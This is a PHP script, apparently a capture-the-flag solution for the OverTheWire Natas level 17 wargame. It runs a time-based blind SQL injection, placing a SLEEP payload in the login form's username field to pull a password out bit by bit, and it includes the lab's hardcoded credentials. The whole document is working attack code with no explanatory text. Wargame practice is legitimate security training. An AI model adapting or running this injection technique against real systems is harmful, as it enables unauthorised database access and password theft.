<?php
use GuzzleHttp\Client;
require 'vendor/autoload.php';
$http = new Client();

define('FUDGE', 3);

/**
 * @param Client $http
 * @param string $suffix
 * @return bool|null
 */
function sqli_oracle(Client $http, $suffix = '1'): ?bool
{
    $start = microtime(true);
    $http->post(
        'http://natas17.natas.labs.overthewire.org/index.php',
        [
            'auth' => ['natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'],
            'form_params' => [
                'username' => 'natas18" AND ' . $suffix . ' AND SLEEP(' . FUDGE . ') #'
            ]
        ]
    );
    $end = microtime(true);
    return ($end - $start) >= FUDGE;
}

$password = $argv[1] ?? '';
for ($i = strlen($password); $i < 65; ++$i) {
    $c = 0;
    for ($j = 0; $j < 8; ++$j) {
        $found = sqli_oracle($http,
            '(ORD(SUBSTRING(password, ' . $i . ', 1)) >> ' . $j .') & 1 = 1'
        );
        if ($found) {
            $c |= 1 << $j;
        }
    }
    if ($c > 0) {
        $password .= chr($c);
    }
    var_dump($password);
}

var_dump($password);
